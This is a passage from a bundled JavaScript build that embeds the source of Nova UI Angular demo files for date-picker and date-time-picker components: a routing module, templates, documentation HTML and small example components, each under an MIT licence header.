DatePickerCurrentMonthExampleComponent,\n    DatePickerDateRangeExampleComponent,\n    DatePickerDisableDateExampleComponent,\n    DatePickerDisabledExampleComponent,\n    DatePickerDocsComponent,\n    DatePickerFirstDateOfWeekExampleComponent,\n    DatePickerFormattingExampleComponent,\n    DatePickerInitDateExampleComponent,\n    DatePickerInitModeExampleComponent,\n    DatePickerInlineExampleComponent,\n    DatePickerInsignificantExampleComponent,\n    DatePickerModesRangeExampleComponent,\n    DatePickerReactiveFormExampleComponent,\n    DatePickerShowWeeksExampleComponent,\n    DatePickerTestComponent,\n    DatePickerTimezoneExampleComponent,\n    DatePickerValueChangeExampleComponent,\n    DatePickerVisualTestComponent,\n    DatePickerWithErrorExampleComponent,\n    DatePickerYearRangeExampleComponent,\n} from "./index";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes = [\n    {\n        path: "",\n        component: DatePickerDocsComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "date-picker-test",\n        component: DatePickerTestComponent,\n    },\n    {\n        path: "date-picker-visual-test",\n        component: DatePickerVisualTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n];\n\n@NgModule({\n    imports: [\n        NuiDatePickerModule,\n        NuiSelectModule,\n        NuiFormFieldModule,\n        NuiValidationMessageModule,\n        FormsModule,\n        ReactiveFormsModule,\n        NuiMessageModule,\n        NuiDocsModule,\n        RouterModule.forChild(routes),\n    ],\n    declarations: [\n        DatePickerBasicExampleComponent,\n        DatePickerCurrentMonthExampleComponent,\n        DatePickerDateRangeExampleComponent,\n        DatePickerDisableDateExampleComponent,\n        DatePickerDisabledExampleComponent,\n        DatePickerDocsComponent,\n        DatePickerFirstDateOfWeekExampleComponent,\n        DatePickerFormattingExampleComponent,\n        DatePickerInitDateExampleComponent,\n        DatePickerInitModeExampleComponent,\n        DatePickerInlineExampleComponent,\n        DatePickerInsignificantExampleComponent,\n        DatePickerModesRangeExampleComponent,\n        DatePickerShowWeeksExampleComponent,\n        DatePickerValueChangeExampleComponent,\n        DatePickerWithErrorExampleComponent,\n        DatePickerYearRangeExampleComponent,\n        DatePickerTestComponent,\n        DatePickerVisualTestComponent,\n        DatePickerCalendarNavigatedExampleComponent,\n        DatePickerReactiveFormExampleComponent,\n        DatePickerTimezoneExampleComponent,\n    ],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("date-picker"),\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class DatePickerModule {}\n'},99908:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./date-picker-basic/date-picker-basic.example.component";\nexport * from "./date-picker-current-month/date-picker-current-month.example.component";\nexport * from "./date-picker-date-range/date-picker-date-range.example.component";\nexport * from "./date-picker-disable-date/date-picker-disable-date.example.component";\nexport * from "./date-picker-disabled/date-picker-disabled.example.component";\nexport * from "./date-picker-docs/date-picker-docs.example.component";\nexport * from "./date-picker-first-date-of-week/date-picker-first-date-of-week.example.component";\nexport * from "./date-picker-formatting/date-picker-formatting.example.component";\nexport * from "./date-picker-init-date/date-picker-init-date.example.component";\nexport * from "./date-picker-init-mode/date-picker-init-mode.example.component";\nexport * from "./date-picker-inline/date-picker-inline.example.component";\nexport * from "./date-picker-insignificant/date-picker-insignificant.example.component";\nexport * from "./date-picker-modes-range/date-picker-modes-range.example.component";\nexport * from "./date-picker-show-weeks/date-picker-show-weeks.example.component";\nexport * from "./date-picker-value-change/date-picker-value-change.example.component";\nexport * from "./date-picker-with-error/date-picker-with-error.example.component";\nexport * from "./date-picker-year-range/date-picker-year-range.example.component";\nexport * from "./date-picker-test/date-picker-test.component";\nexport * from "./date-picker-visual-test/date-picker-visual-test.component";\nexport * from "./date-picker-calendar-navigated/date-picker-calendar-navigated.example.component";\nexport * from "./date-picker-reactive-form/date-picker-reactive-form.example.component";\nexport * from "./date-picker-timezone/date-picker-timezone.example.component";\n'},4436:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<section class="demo-options-section">\n    <nui-date-time-picker\n        (modelChanged)="onModelChanged($event)"\n        [model]="dt"\n    ></nui-date-time-picker>\n    <p class="mt-2">{{ selectedDate }}</p>\n</section>\n'},86356:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport moment, { Moment } from "moment/moment";\n\n@Component({\n    selector: "nui-date-time-picker-basic-example",\n    templateUrl: "./date-time-picker-basic.example.component.html",\n})\nexport class DateTimePickerBasicExampleComponent {\n    public dt: Moment;\n    public selectedDate: Date;\n    constructor() {\n        this.dt = moment();\n        this.selectedDate = new Date(this.dt.valueOf());\n    }\n\n    onModelChanged(event: any): void {\n        this.selectedDate = new Date(event.valueOf());\n    }\n}\n'},71834:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<ng-template #content let-close="close" let-dismiss="dismiss">\n    <nui-dialog-header\n        title="Dialog title"\n        i18n-title\n        (closed)="close()"\n    ></nui-dialog-header>\n    <div class="dialog-body responsive-mode">\n        <section class="demo-options-section">\n            <nui-date-time-picker\n                (modelChanged)="onModelChanged($event)"\n                displayMode="inline"\n                [model]="dt"\n            ></nui-date-time-picker>\n            <p class="mt-2">{{ selectedDate }}</p>\n        </section>\n    </div>\n    <nui-dialog-footer>\n        <button nui-button type="button" (click)="close()" i18n>Close</button>\n    </nui-dialog-footer>\n</ng-template>\n\n<button\n    id="nui-demo-default-dialog-btn"\n    nui-button\n    type="button"\n    (click)="open(content)"\n    i18n\n>\n    Open dialog\n</button>\n'},4998:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject, TemplateRef } from "@angular/core";\nimport moment, { Moment } from "moment/moment";\n\nimport { DialogService } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-date-time-picker-dialog-example",\n    templateUrl: "./date-time-picker-dialog.example.component.html",\n})\nexport class DateTimePickerDialogExampleComponent {\n    public dt: Moment;\n    public selectedDate: Date;\n\n    constructor(@Inject(DialogService) private dialogService: DialogService) {\n        this.dt = moment();\n        this.selectedDate = new Date(this.dt.valueOf());\n    }\n\n    public open(content: TemplateRef<string>): void {\n        this.dialogService.open(content, { size: "sm" });\n    }\n\n    public onModelChanged(event: any): void {\n        this.selectedDate = new Date(event.valueOf());\n    }\n}\n'},31398:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<section class="demo-options-section">\n    <nui-date-time-picker\n        [isDisabled]="true"\n        (modelChanged)="onModelChanged($event)"\n        [model]="dt"\n    ></nui-date-time-picker>\n    <p class="mt-2">{{ selectedDate }}</p>\n</section>\n'},83346:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport moment, { Moment } from "moment/moment";\n\n@Component({\n    selector: "nui-date-time-picker-disabled-example",\n    templateUrl: "./date-time-picker-disabled.example.component.html",\n})\nexport class DateTimePickerDisabledExampleComponent {\n    public dt: Moment;\n    public selectedDate: Date;\n\n    constructor() {\n        this.dt = moment();\n        this.selectedDate = new Date(this.dt.valueOf());\n    }\n\n    public onModelChanged(event: any): void {\n        this.selectedDate = new Date(event.valueOf());\n    }\n}\n'},71938:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<h2>Required Modules</h2>\n<ul>\n    <li>\n        <code>NuiDateTimePickerModule</code>\n    </li>\n</ul>\n\n<h2>Basic Usage</h2>\n<p>\n    <code>&lt;nui-date-time-picker&gt;</code> allows user to select a specific\n    time moment setting correspondent date and time. For time selecting\n    <code\n        ><a href="../components/TimePickerComponent.html"\n            >nui-time-picker</a\n        ></code\n    >\n    is used, for date selecting\n    <code\n        ><a href="../components/DatePickerComponent.html"\n            >nui-date-picker</a\n        ></code\n    >.\n</p>\n<nui-example-wrapper\n    filenamePrefix="date-time-picker-basic"\n    exampleTitle="Basic Usage"\n>\n    <nui-date-time-picker-basic-example></nui-date-time-picker-basic-example>\n</nui-example-wrapper>\n\n<h2>Empty Initial State</h2>\n<p>\n    <code>&lt;nui-date-time-picker&gt;</code> allows user to init a component\n    with the empty values using the attribute "initEmpty". For time selecting\n    <code\n        ><a href="../components/TimePickerComponent.html"\n            >nui-time-picker</a\n        ></code\n    >\n    is used, for date selecting\n    <code\n        ><a href="../components/DatePickerComponent.html"\n            >nui-date-picker</a\n        ></code\n    >.\n</p>\n<nui-example-wrapper\n    filenamePrefix="date-time-picker-empty-state"\n    exampleTitle="Empty Initial State"\n>\n    <nui-date-time-picker-empty-state></nui-date-time-picker-empty-state>\n</nui-example-wrapper>\n\n<h2>Reactive Form Usage</h2>\n<p>\n    <code>&lt;nui-date-time-picker&gt;</code> may be used in a reactive form by\n    setting the <code>formControl</code> input.\n</p>\n<nui-example-wrapper\n    filenamePrefix="date-time-picker-reactive-form"\n    exampleTitle="Reactive Form Usage"\n>\n    <nui-date-time-picker-reactive-forms-example></nui-date-time-picker-reactive-forms-example>\n</nui-example-wrapper>\n\n<h2>Min/Max value</h2>\n<p>\n    To set min or max date for date field of <code>dateTimePicker</code> use\n    minDate or maxDate input (as shown in DatePicker docs).\n</p>\n<nui-example-wrapper\n    filenamePrefix="date-time-picker-range-values"\n    exampleTitle="Date Range Values"\n>\n    <nui-date-time-picker-range-values-example></nui-date-time-picker-range-values-example>\n</nui-example-wrapper>\n\n<h2>Disabled Mode</h2>\n<p>To disable dateTimePicker set isDisabled input to true</p>\n<nui-example-wrapper\n    filenamePrefix="date-time-picker-disabled"\n    exampleTitle="Disabled Mode"\n>\n    <nui-date-time-picker-disabled-example></nui-date-time-picker-disabled-example>\n</nui-example-wrapper>\n\n<h2>Inline Mode</h2>\n<p>\n    Set displayMode mode binding to \'inline\' in order to set row direction for\n    <code>dateTimePicker\'s</code> input fields.\n</p>\n<nui-example-wrapper\n    filenamePrefix="date-time-picker-inline"\n    exampleTitle="Inline Mode"\n>\n    <nui-date-time-picker-inline-example></nui-date-time-picker-inline-example>\n</nui-example-wrapper>\n\n<h2>Timezones</h2>\n<p>\n    As far as <code>DateTimePickerComponent</code> uses\n    <code>DatePickerComponent</code> it can also be used with handling\n    timezones. Setting <code>handleTimezone</code> flag to\n    <code>true</code> makes handling timezone.\n</p>\n<nui-example-wrapper\n    filenamePrefix="date-time-picker-timezones"\n    exampleTitle="Timezones"\n>\n    <nui-date-time-picker-timezones-example></nui-date-time-picker-timezones-example>\n</nui-example-wrapper>\n\n<h2>Appending Popup Controls to the Document Body</h2>\n<p>\n    DateTimePicker popups (for both <code>DatePicker</code> and\n    <code>TimePicker</code>) can be appended to the document\n    <code>body</code> by setting the <code>appendToBody</code> input to\n    <code>true</code>.\n</p>\n<nui-example-wrapper\n    filenamePrefix="date-time-picker-dialog"\n    exampleTitle="Appending Popups to Document Body"\n>\n    <nui-date-time-picker-dialog-example></nui-date-time-picker-dialog-example>\n</nui-example-wrapper>\n'},64030:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-date-time-picker-docs-example",\n    templateUrl: "./date-time-picker-docs.example.component.html",\n})\nexport class DateTimePickerDocsComponent {}\n'},39054:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<section class="demo-options-section">\n    <nui-form-field caption="Date Time Picker" [control]="control">\n        <nui-date-time-picker\n            [initEmpty]="initEmpty"\n            [formControl]="control"\n            (modelChanged)="onModelChanged($event)"\n        ></nui-date-time-picker>\n        <nui-validation-message for="required">\n            This field is required\n        </nui-validation-message>\n        <nui-validation-message for="invalidFormat">\n            Invalid format\n        </nui-validation-message>\n    </nui-form-field>\n    <p class="mt-2">Value: {{ selectedDate }}</p>\n    <p class="mt-2">Valid: {{ control.valid }}</p>\n    <p class="mt-2">Touched: {{ control.touched }}</p>\n    <p class="mt-2">Dirty: {{ control.dirty }}</p>\n</section>\n'},49610:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport { FormControl, Validators } from "@angular/forms";\nimport { Moment } from "moment/moment";\n\n@Component({\n    selector: "nui-date-time-picker-empty-state",\n    templateUrl: "./date-time-picker-empty-state.component.html",\n})\nexport class DateTimePickerEmptyStateComponent {\n    public dt: Moment | undefined = undefined;\n    public selectedDate: Date | String = "";\n    public initEmpty: boolean = true;\n    public control = new FormControl(this.dt, Validators.required);\n\n    constructor() {}\n\n    public onModelChanged(event: Moment): void {\n        this.selectedDate = new Date(event.valueOf());\n    }\n}\n'},69506:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<section class="demo-options-section">\n    <nui-date-time-picker\n        displayMode="inline"\n        (modelChanged)="onModelChanged($event)"\n        [model]="dt"\n    ></nui-date-time-picker>\n    <p class="mt-2">{{ selectedDate }}</p>\n</section>\n'},96702:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport moment, { Moment } from "moment/moment";\n\n@Component({\n    selector: "nui-date-time-picker-inline-example",\n    templateUrl: "./date-time-picker-inline.example.component.html",\n})\nexport class DateTimePickerInlineExampleComponent {\n    public dt: Moment;\n    public selectedDate: Date;\n    constructor() {\n        this.dt = moment();\n        this.selectedDate = new Date(this.dt.valueOf());\n    }\n\n    public onModelChanged(event: any): void {\n        this.selectedDate = new Date(event.valueOf());\n    }\n}\n'},39646:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<section class="demo-options-section">\n    <nui-date-time-picker\n        [minDate]="minDate"\n        [maxDate]="maxDate"\n        (modelChanged)="onModelChanged($event)"\n        [model]="dt"\n    ></nui-date-time-picker>\n    <p class="mt-2">{{ selectedDate }}</p>\n</section>\n'},8826:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport moment, { Moment } from "moment/moment";\n\n@Component({\n    selector: "nui-date-time-picker-range-values-example",\n    templateUrl: "./date-time-picker-range-values.example.component.html",\n})\nexport class DateTimePickerRangeValuesExampleComponent {\n    private currentDate = moment();\n\n    public dt: Moment;\n    public selectedDate: Date;\n    public minDate: Moment = this.currentDate.clone().date(5);\n    public maxDate: Moment = this.currentDate.clone().date(25);\n\n    constructor() {\n        this.dt = moment();\n        this.selectedDate = new Date(this.dt.valueOf());\n    }\n\n    public onModelChanged(event: any): void {\n        this.selectedDate = new Date(event.valueOf());\n    }\n}\n'},36872:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<section class="demo-options-section">\n    <nui-form-field caption="Date Time Picker" [control]="control">\n        <nui-date-time-picker\n            [formControl]="control"\n            (modelChanged)="onModelChanged($event)"\n        ></nui-date-time-picker>\n        <nui-validation-message for="required">\n            This field is required\n        </nui-validation-message>\n        <nui-validation-message for="invalidFormat">\n            Invalid format\n        </nui-validation-message>\n    </nui-form-field>\n    <p class="mt-2">Value: {{ selectedDate }}</p>\n    <p class="mt-2">Valid: {{ control.valid }}</p>\n    <p class="mt-2">Touched: {{ control.touched }}</p>\n    <p class="mt-2">Dirty: {{ control.dirty }}</p>\n</section>\n'},30136:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport { FormControl, Validators } from "@angular/forms";\nimport moment, { Moment } from "moment/moment";\n\n@Component({\n    selector: "nui-date-time-picker-reactive-forms-example",\n    templateUrl: "./date-time-picker-reactive-form.example.component.html",\n})\nexport class DateTimePickerReactiveFormExampleComponent {\n    public dt: Moment = moment();\n    public selectedDate: Date = new Date(this.dt.valueOf());\n    public control = new FormControl(this.dt, Validators.required);\n\n    constructor() {}\n\n    public onModelChanged(event: Moment): void {\n        this.selectedDate = new Date(event.valueOf());\n    }\n}\n'},96618:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<section class="demo-options-section">\n    <div class="row">\n        <div class="col-6">\n            <nui-date-time-picker\n                id="nui-demo-date-time-picker"\n                (modelChanged)="onModelChanged($event)"\n                [model]="dt"\n            ></nui-date-time-picker>\n        </div>\n        <div class="col-6">\n            <p id="model-value">\n                {{ selectedDate }}\n            </p>\n        </div>\n    </div>\n</section>\n'},36022:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport moment, { Moment } from "moment/moment";\n\n@Component({\n    selector: "nui-date-time-picker-test",\n    templateUrl: "./date-time-picker-test.component.html",\n})\nexport class DateTimePickerTestComponent {\n    public dt: Moment;\n    public selectedDate: string;\n\n    constructor() {\n        this.dt = moment().set({\n            year: 1970,\n            month: 2,\n            date: 15,\n            hour: 15,\n            minute: 30,\n        });\n        this.selectedDate = moment(this.dt).format("YYYY-MM-DD HH:mm");\n    }\n\n    public onModelChanged(event: any): void {\n        this.selectedDate = moment(event).format("YYYY-MM-DD HH:mm");\n    }\n}\n'},75520:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<section class="demo-options-section">\n    <nui-form-field caption="Date Picker" [control]="control">\n        <nui-date-time-picker\n            [formControl]="control"\n            [handleTimezone]="true"\n        ></nui-date-time-picker>\n    </nui-form-field>\n    <p class="mt-2">Value: {{ selectedDate }}</p>\n\n    <nui-combobox\n        [itemsSource]="displayedZones"\n        [value]="initialZone"\n        (changed)="textboxChanged($event)"\n        placeholder="Select item"\n        i18n-placeholder\n    ></nui-combobox>\n</section>\n'},78848:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS 